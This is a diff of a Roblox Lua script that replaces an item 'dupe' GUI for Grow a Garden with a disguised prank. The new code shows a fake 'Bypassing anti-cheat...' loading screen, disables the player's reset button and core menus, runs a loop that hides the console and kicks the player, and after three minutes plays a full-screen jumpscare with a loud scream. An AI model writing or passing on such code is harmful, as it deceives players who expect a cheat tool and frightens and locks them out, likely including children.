@@ -1,41 +1,96 @@
---// Grow a Garden - Visual Dupe GUI Script by ScriptZy 
+-- LocalScript in StarterPlayerScripts
 
--- Create Screen GUI
-local ScreenGui = Instance.new("ScreenGui")
-local Frame = Instance.new("Frame")
-local DupeButton = Instance.new("TextButton")
-local CloseButton = Instance.new("TextButton")
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local StarterGui = game:GetService("StarterGui")
+local player = Players.LocalPlayer
+local RunService = game:GetService("RunService")
 
-ScreenGui.Parent = game.CoreGui
-ScreenGui.Name = "GrowAGardenGUI"
+-- Remove reset button and escape menu
+StarterGui:SetCore("ResetButtonCallback", false)
+StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
 
-Frame.Size = UDim2.new(0, 200, 0, 120)
-Frame.Position = UDim2.new(0.5, -100, 0.5, -60)
-Frame.BackgroundColor3 = Color3.fromRGB(34, 139, 34)
-Frame.BorderSizePixel = 2
-Frame.Parent = ScreenGui
+-- Create ScreenGui
+local screenGui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
+screenGui.Name = "LoadingScreen"
+screenGui.ResetOnSpawn = false
 
-DupeButton.Size = UDim2.new(0, 160, 0, 40)
-DupeButton.Position = UDim2.new(0, 20, 0, 20)
-DupeButton.Text = "🌱 Dupe Items"
-DupeButton.BackgroundColor3 = Color3.fromRGB(144, 238, 144)
-DupeButton.Font = Enum.Font.GothamBold
-DupeButton.TextSize = 16
-DupeButton.Parent = Frame
+-- Background
+local frame = Instance.new("Frame", screenGui)
+frame.Size = UDim2.new(1, 0, 1, 0)
+frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
 
-CloseButton.Size = UDim2.new(0, 160, 0, 30)
-CloseButton.Position = UDim2.new(0, 20, 0, 70)
-CloseButton.Text = "❌ Close"
-CloseButton.BackgroundColor3 = Color3.fromRGB(240, 128, 128)
-CloseButton.Font = Enum.Font.Gotham
-CloseButton.TextSize = 14
-CloseButton.Parent = Frame
+-- Loading Text
+local loadingText = Instance.new("TextLabel", frame)
+loadingText.Size = UDim2.new(1, 0, 0.1, 0)
+loadingText.Position = UDim2.new(0, 0, 0.4, 0)
+loadingText.BackgroundTransparency = 1
+loadingText.Text = "Loading... 0%"
+loadingText.TextScaled = true
+loadingText.Font = Enum.Font.SourceSansBold
+loadingText.TextColor3 = Color3.fromRGB(255, 255, 255)
 
--- Dupe Function (Modify depending on the game method)
-DupeButton.MouseButton1Click:Connect(function()
-    local player = game.Players.LocalPlayer
-    local garden = workspace:FindFirstChild("Garden") or workspace:FindFirstChild(player.Name .. "'s Garden")
+-- Subtext ("Bypassing anti-cheat")
+local subText = Instance.new("TextLabel", frame)
+subText.Size = UDim2.new(1, 0, 0.05, 0)
+subText.Position = UDim2.new(0, 0, 0.5, 0)
+subText.BackgroundTransparency = 1
+subText.Text = "Bypassing anti-cheat..."
+subText.TextScaled = true
+subText.Font = Enum.Font.SourceSansItalic
+subText.TextColor3 = Color3.fromRGB(180, 180, 180)
 
-    if garden then
-        for _, item in pairs(garden:GetChildren()) do
-            if item:IsA("Model") 
+-- Jumpscare Image
+local jumpscare = Instance.new("ImageLabel", frame)
+jumpscare.Size = UDim2.new(1, 0, 1, 0)
+jumpscare.Position = UDim2.new(0, 0, 0, 0)
+jumpscare.Image = "rbxassetid://13743730234" -- Replace with your jumpscare image
+jumpscare.ImageTransparency = 1
+jumpscare.BackgroundTransparency = 1
+jumpscare.ZIndex = 2
+
+-- Scream Sound
+local scream = Instance.new("Sound", frame)
+scream.SoundId = "rbxassetid://9118823106" -- Replace with your scream sound
+scream.Volume = 5
+
+-- Prevent Leave Function (Trick)
+local function trapPlayer()
+	while true do
+		pcall(function()
+			StarterGui:SetCore("DevConsoleVisible", false)
+			StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
+		end)
+		player:Kick("Leave disabled.") -- Optional: use if you want them to see leave is blocked
+		wait(1)
+	end
+end
+
+-- Simulate Loading
+local percent = 0
+local loadingComplete = false
+
+task.spawn(function()
+	while percent < 100 do
+		percent += 1
+		loadingText.Text = "Loading... " .. percent .. "%"
+		wait(0.1) -- slow down loading
+	end
+	loadingComplete = true
+end)
+
+-- Jumpscare Timer (3 mins after 100%)
+task.spawn(function()
+	while not loadingComplete do wait(1) end
+	local doneTime = tick()
+	while tick() - doneTime < 180 do wait(1) end
+
+	-- Jumpscare
+	jumpscare.ImageTransparency = 0
+	scream:Play()
+	wait(3)
+	screenGui:Destroy()
+end)
+
+-- Lock player inside
+task.spawn(trapPlayer)
